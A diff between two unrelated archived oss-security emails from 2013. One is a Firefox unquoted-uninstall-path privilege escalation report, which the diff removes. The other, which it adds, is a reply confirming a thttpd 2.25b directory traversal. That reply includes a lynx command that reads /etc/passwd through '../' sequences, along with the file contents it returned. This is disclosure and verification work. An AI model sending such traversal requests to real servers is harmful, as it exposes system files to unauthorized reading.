@@ -1,62 +1,63 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/07/10/14
-Message-ID: <51DDBA28.6080306@redhat.com>
-Date: Wed, 10 Jul 2013 13:46:48 -0600
-From: Kurt Seifried <kseifried@...hat.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/05/22/15
+Message-ID: <519CF74A.1070902@virtadpt.net>
+Date: Wed, 22 May 2013 12:50:18 -0400
+From: The Doctor <drwho@...tadpt.net>
 To: oss-security@...ts.openwall.com
-CC: Stefan Kanthak <stefan.kanthak@...go.de>, security@...illa.org
-Subject: Re: CVE request for Mozilla Firefox (Windows)
+Subject: Re: Fwd: [Full-disclosure] Thttpd 2.25b Directory Traversal Vulnerability
 Content-Type: text/plain; charset=utf-8
 
 -----BEGIN PGP SIGNED MESSAGE-----
 Hash: SHA1
 
-On 07/10/2013 12:56 PM, Stefan Kanthak wrote:
-> The installer of Mozilla Firefox writes the following command line 
-> with unquoted spaces for uninstallation into the Windows registry:
-> 
-> [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Mozilla
-> Firefox 22.0 (x86 en-US)] "UninstallString"="C:\\Program
-> Files\\Mozilla Firefox\\uninstall\\helper.exe"
-> 
-> See <https://bugzilla.mozilla.org/show_bug.cgi?id=871084>, 
-> <https://bugzilla.mozilla.org/show_bug.cgi?id=786407> and 
-> <https://bugzilla.mozilla.org/show_bug.cgi?id=868746>
-> 
-> Due to a well-known and well-documented idiosyncrasy of Windows' 
-> CreateProcess() API this can result in the execution of a rogue 
-> program "C:\Program.exe" or "C:\Program Files\Mozilla.exe" with
-> the privileges of the caller. Since the caller of this command line
-> typically has administrative rights this vulnerability can lead to
-> a privilege escalation.
-> 
-> Affected versions: all current releases.
-> 
-> Fixed version: 23.0.
-> 
-> Stefan Kanthak
-> 
+On 05/22/2013 09:29 AM, Vitezslav Cizek wrote:
 
-Mozilla is a CNA (http://cve.mitre.org/cve/cna.html) so they'll need
-to handle this one. Adding them to CC.
+> Are you sure? I fail to reproducet the problem.
+> 
+> How do you use lynx? Do you prepend "http://" to the url? Otherwise
+> lynx won't connect over network and will default to local
+> filesystem.
+> 
+> For example: $ lynx -dump "google.com:80/../../../../etc/passwd" 
+> wil get you you're local /etc/passwd
+
+For what it's worth, I'm getting the same results with the same
+version of thttpd.
+
+$ lynx -dump drwho.virtadpt.net:80/../../../../../../../../etc/passwd
+root:*:0:0:Charlie &:/root:/bin/ksh
+daemon:*:1:1:The devil himself:/root:/sbin/nologin
+operator:*:2:5:System &:/operator:/sbin/nologin
+bin:*:3:7:Binaries Commands and Source,,,:/:/sbin/nologin
+smmsp:*:25:25:Sendmail Message Submission
+Program:/nonexistent:/sbin/nologin
+popa3d:*:26:26:POP3 Server:/var/empty:/sbin/nologin
+sshd:*:27:27:sshd privsep:/var/empty:/sbin/nologin
+...blah blah blah...
+
+versus:
+
+$ lynx -dump
+http://drwho.virtadpt.net:80/../../../../../../../../etc/passwd
+
+                                  Bad Request
+
+   Your browser sent a request that this server could not understand.
 
 - -- 
-Kurt Seifried Red Hat Security Response Team (SRT)
-PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.13 (GNU/Linux)
+The Doctor [412/724/301/703] [ZS]
+Developer, Project Byzantium: http://project-byzantium.org/
 
-iQIcBAEBAgAGBQJR3bonAAoJEBYNRVNeJnmTAMAP/jSmT4oCK0uN6UB1j5hp3Puq
-xL1xbhag5gXxe75DG2BO8On4gsEvcOTgJzEedlqAz2jpx/YRwiErSz8fYw4HRP3r
-mC9IuL51Tl1seh/L0h+0moWTX4To+E49IdsODhK5EvczCfFKVxDPxPNDDXZu0A1p
-qpb3sH+dujiBq9LgkZwaP43ByCl2rR1YPRdhK8JJ+yKh5WlX6CfBSSaW0xX2nB6J
-oPqUgNmBf45zwXJeRcvv1nSTlGtcaaK+OeOxi3Iv0ooekAeqp4m+Hsp1MjQql76R
-gnDjA4h2vkmXk8+UuCNxxg0LRPKNWf9WQrKxqiwrpgMpInV6BIf7785kuskaGZfI
-D3E247hCyWNiewddBk5No7WoIw87g0rd8osg1irvegxDVCOZAm06rcpFco67pCGm
-vdtpF8jnsN53qbDlXhYQ6R8D1s4dhLJTooWQ+tpRGN0mDInbnLiJtvZ7iAvByP1b
-w6GpR/2RHC+49NyLevjNtrJsLrtag/FBR5a3wGTpJPX6Vejl7fHTQH94HF9bZt5d
-eosuGwYFBHJVvvqt9wCYv9gdNNSPqq/MK1HLL1m/gALH/QVrBN7qWXIeGNXQQlMk
-2fx+EtHjalDRlFBjQBv5koJUIF7vl/NUgIud6S9M0W5WpBUAdrs+hKKZQ/0dqr/2
-16XrC8jWRZvgQUu8K6IA
-=BEs1
+PGP: 0x807B17C1 / 7960 1CDC 85C9 0B63 8D9F  DD89 3BD8 FF2B 807B 17C1
+WWW: https://drwho.virtadpt.net/
+
+"Am I missing an eyebrow?"
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v2.0.19 (GNU/Linux)
+Comment: Using GnuPG with Thunderbird - http://www.enigmail.net/
+
+iEYEARECAAYFAlGc90oACgkQO9j/K4B7F8GgcQCgrgdV2puuyGh7P3t8tIaqRIXx
+xHQAoNRvkLreR5OOFukhEsiUFLtUy/V3
+=n8K3
 -----END PGP SIGNATURE-----
